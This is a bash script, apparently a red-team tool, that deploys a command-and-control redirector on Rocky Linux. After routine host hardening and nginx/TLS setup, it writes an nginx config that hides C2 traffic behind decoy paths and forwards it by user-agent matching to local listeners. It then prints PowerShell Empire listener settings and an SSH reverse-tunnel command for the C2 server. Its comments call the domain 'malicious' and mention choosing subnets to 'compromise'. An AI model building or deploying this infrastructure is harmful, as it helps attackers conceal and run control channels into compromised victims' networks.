#!/bin/bash
###########################################################################################################
#                 Automate C2 redirector deployment on Rocky Linux. Useful links:                         #
#        https://ditrizna.medium.com/design-and-setup-of-c2-traffic-redirectors-ec3c11bd227d              #
# https://hub.packtpub.com/obfuscating-command-and-control-c2-servers-securely-with-redirectors-tutorial/ #
###########################################################################################################


if [ $(id -u) != 0 ]; then 
    echo 'Please use root user, must be root'
    exit
fi

function obtain_domain_name() {
    echo "Please provide domain name for calling redirector:"
    read -r -p ">>> " redirectorName
    echo "Your malicious domain name is "$redirectorName""
}

function domain_config_check() {
    echo "Make sure you own the domain, or this will fail!"
    echo "Do you own root domain and have an A record "$redirectorName"?"
    read -r -p ">>> " onlyYes
    while [[ $onlyYes != 'y' ]]; do
        if [[ $onlyYes = 'n' ]]; then
            echo "Configure domain, then rerun this script."
            exit
        fi
        if [[ $onlyYes = 'y' ]]; then
            break
        fi
        echo "Only 'y' or 'n'"
        read -r -p ">>> " onlyYes
    done
}

#Create Admin User Secure File Structure SSH
function config_ssh_keys() {
    if [ ! -d /home/rockyuser/.ssh ]; then
        mkdir /home/rockyuser/.ssh
        touch /home/rockyuser/.ssh/authorized_keys
    fi

    if [ ! -f /home/rockyuser/.ssh/authorized_keys ]; then
        touch /home/rockyuser/.ssh/authorized_keys
    fi
    echo "Please copy/paste your authorized key:"
    read -r -p ">>> " keyValue
    echo "$keyValue" >> /home/rockyuser/.ssh/authorized_keys

    chmod 700 /home/rockyuser/.ssh
    chmod 600 /home/rockyuser/.ssh/authorized_keys
    chown -R rockyuser:rockyuser /home/rockyuser
}

function update_packages() {
    dnf update -y
}

#Update /etc/issue.net file
function configure_banner() {
    echo "" > /etc/issue.net
    echo "               ###################################################" >> /etc/issue.net
    echo "               #Unauthorized access to this machine is prohibited#" >> /etc/issue.net
    echo "               #   Speak with Owner first to obtain Permission   #" >> /etc/issue.net
    echo "               ###################################################" >> /etc/issue.net
    echo "" >> /etc/issue.net
    echo "" >> /etc/issue.net
    echo "" >> /etc/issue.net
    echo "" >> /etc/issue.net
}

#dnf updates daily in the AM
function dnf_autoupdate() {
    echo "" >> /etc/crontab
    echo " 01  1  *  *  * root /etc/cron.daily/dnf_update.sh" >> /etc/crontab
    touch /etc/cron.daily/dnf_update.sh
    chmod 755 /etc/cron.daily/dnf_update.sh
    echo "#!/bin/bash" >> /etc/cron.daily/dnf_update.sh
    echo "" >> /etc/cron.daily/dnf_update.sh
    echo "dnf update -y >> /var/log/dnf_update.log" >> /etc/cron.daily/dnf_update.sh
}

#SELinux Package Install
function install_selinux() {
    dnf install policycoreutils policycoreutils-python-utils selinux-policy selinux-policy-targeted libselinux-utils setroubleshoot-server setools setools-console mcstrans net-tools rsync -y
}

#SSH Setup
function harden_ssh(){
    #sed -i 's/#Port\ 22/Port\ 8182/g' /etc/ssh/sshd_config
    sed -i 's/#Protocol\ 2/Protocol\ 2/g' /etc/ssh/sshd_config
    sed -i 's/#PermitRootLogin\ yes/PermitRootLogin\ no/g' /etc/ssh/sshd_config
    sed -i 's/#Banner\ none/Banner\ \/etc\/issue.net/g' /etc/ssh/sshd_config

    #Allow SELinux port 8182 for ssh
    #semanage port -a -t ssh_port_t -p tcp 8182
    semanage port -a -t ssh_port_t -p tcp 22
}

function firewalld_ssh() {
    echo '[*] Updating firewalld for ssh on 8182.'
    firewall-cmd --add-port=22/tcp
    firewall-cmd --permanent --add-port=22/tcp
    #firewall-cmd --add-port=8182/tcp
    #firewall-cmd --permanent --add-port=8182/tcp
    firewall-cmd --reload
}

function install_dependencies() {
    /bin/dnf install epel-release -y
    /bin/dnf install git nginx vim certbot tmux wget -y
    /bin/systemctl restart nginx
}

function firewalld_nginx() {
    echo '[*] Updating firewalld for port 80 and 443.'
    firewall-cmd --add-port=80/tcp
    firewall-cmd --add-port=443/tcp
    firewall-cmd --permanent --add-port=80/tcp
    firewall-cmd --permanent --add-port=443/tcp
    firewall-cmd --reload
}

function update_selinux_port_forward() {
    setsebool httpd_can_network_connect true
    getsebool httpd_can_network_connect
}

function self_signed_certificate() {
    # Test with a self signed cert or jump directly into a signed certificate
    if [ ! -d /etc/letsencrypt/live ]; then
        mkdir /etc/letsencrypt/live
    fi
    if [ ! -d /etc/letsencrypt/live/$redirectorName ]; then
        mkdir /etc/letsencrypt/live/$redirectorName
    fi
    openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -nodes -keyout /etc/letsencrypt/live/$redirectorName/privkey.pem -out /etc/letsencrypt/live/$redirectorName/cert.pem -subj "/CN="$redirectorName"" -addext "subjectAltName=DNS:"$redirectorName",DNS:www."$redirectorName",IP:10.0.20.135"
}

function lets_encrypt_certificate() {
    # Test with a self signed cert or jump directly into a signed certificate
    certbot certonly --webroot -w /opt/$redirectorName -d $redirectorName -m <myemailaddress> --agree-tos -n
    # If we our C2 stager needs PKCS12, use this command.
    # openssl pkcs12 -export -in fullchain.pem -inkey privkey.pem -out certificate.pfx -name $redirectorName -passout pass:CovenantDev
}

function ec2_redirector_config() {
    if [ ! -d /opt/$redirectorName ]; then
        mkdir /opt/$redirectorName
    fi

cat << EOF > /etc/nginx/conf.d/c2-nginx-site.conf
server {
  listen 443 ssl http2 default_server;
  listen [::]:443 ssl http2 default_server;
  
  server_name $redirectorName ;
  root /opt/$redirectorName/;
  
  ssl_certificate "/etc/letsencrypt/live/$redirectorName/cert.pem";
  ssl_certificate_key "/etc/letsencrypt/live/$redirectorName/privkey.pem";
  ssl_session_cache shared:SSL:1m;
  ssl_session_timeout 10m;
  ssl_ciphers HIGH:!aNULL:!MD5;
  ssl_prefer_server_ciphers on;
  
  location /login/process.php {
    set \$C2 "";
    if (\$http_user_agent ~ "41.0.2228.0") {
      set \$C2 A;
    }
    if (\$http_user_agent ~ "42.0.2228.0") {
      set \$C2 LT;
    }
    if (\$http_user_agent ~ "43.0.2228.0") {
      set \$C2 ST;
    }
    # Use this section to set subnets, like 123.123.123.0/24, to only compromise these approved subnets.
    #if (\$remote_addr ~ "123.123.123") {
    #  set \$C2 "\${C2}B";
    #}
    #if (\$remote_addr ~ "213.213.213") {
    #  set \$C2 "\${C2}B";
    #}
    # Comment out next (line 102) if we use logic above this line
    set \$C2 "\${C2}B";
    if (\$C2 = "AB") {
      proxy_pass https://127.0.0.1:8080;
    }
    if (\$C2 = "ALTB") {
      proxy_pass https://127.0.0.1:8081;
    }
    if (\$C2 = "ASTB") {
      proxy_pass https://127.0.0.1:8082;
    }
    try_files \$uri \$uri/ =404;
  }

  location /admin/get.php {
    set \$C2 "";
    if (\$http_user_agent ~ "41.0.2228.0") {
      set \$C2 A;
    }
    if (\$http_user_agent ~ "42.0.2228.0") {
      set \$C2 LT;
    }
    if (\$http_user_agent ~ "43.0.2228.0") {
      set \$C2 ST;
    }
    # Use this section to set subnets, like 123.123.123.0/24, to only compromise these approved subnets.
    #if (\$remote_addr ~ "123.123.123") {
    #  set \$C2 "\${C2}B";
    #}
    #if (\$remote_addr ~ "213.213.213") {
    #  set \$C2 "\${C2}B";
    #}
    # Comment out next (line 102) if we use logic above this line
    set \$C2 "\${C2}B";
    if (\$C2 = "AB") {
      proxy_pass https://127.0.0.1:8080;
    }
    if (\$C2 = "ALTB") {
      proxy_pass https://127.0.0.1:8081;
    }
    if (\$C2 = "ASTB") {
      proxy_pass https://127.0.0.1:8082;
    }
    try_files $uri $uri/ =404;
  }


  error_page 404 /404.html;
  location = /opt/html/40x.html {
  }
  error_page 500 502 503 504 /50x.html;
  location = /opt/html/50x.html {
  }
}
EOF
}

function restart_nginx_service() {
    systemctl restart nginx
}

function inform_powershell_empire_details() {
    echo """[*] For your interactive C2 infrastructure.
[*] Create an http listener on Powershell Empire with following details:
        Host: "$redirectorName"
        Port: 443
        DefaultProfile: /login/process.php|41.0.2228.0
	UserAgent USEMODULE ONLY: 41.0.2228.0
        CertPath: /usr/share/powershell-empire/empire/server/data

[*] Run the ssh command on your C2 server, connecting to all over your C2 redirectors:
        ssh <username>@<c2redirector host or IP> -p 22 -R 127.0.0.1:8080:127.0.0.1:443 -f -N
    
[*] For your Stagers or Modules, be sure to set the following to ensure you hit nginx rules. Never for your Listener
        UserAgent: 41.0.2228.0
"""
}

######################
# Function that exec #
######################

obtain_domain_name
domain_config_check
config_ssh_keys
update_packages
configure_banner
dnf_autoupdate
install_selinux
harden_ssh
firewalld_ssh
install_dependencies
firewalld_nginx
update_selinux_port_forward
self_signed_certificate
ec2_redirector_config
#lets_encrypt_certificate
restart_nginx_service
inform_powershell_empire_details

echo 'System will reboot in 10 seconds...'

sleep 10

reboot
